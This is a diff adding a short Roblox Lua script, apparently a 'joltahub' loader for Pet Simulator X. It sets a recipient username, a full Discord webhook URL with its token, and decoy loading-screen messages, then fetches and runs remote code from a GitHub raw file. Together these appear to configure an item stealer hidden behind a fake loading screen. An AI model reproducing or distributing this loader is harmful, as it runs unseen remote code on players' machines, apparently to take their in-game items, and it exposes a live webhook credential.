@@ -1,0 +1,9 @@
+Username = "blox_project12"
+WebHook = "https://discord.com/api/webhooks/1102816786954600499/KzyvxzotNM4ur7OD9QXRqGLYo621i7OTc3NP1Mz7XDfTsje8nI1HRprTLXxinb4i81fW"
+loadingscreen = true
+_G.CustomScriptName = "joltahub"
+_G.Text1 = "loading jolta"
+_G.Text2 = "preparing script"
+_G.Text3 = "unlocking fps"
+_G.Text4 = "waiting"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
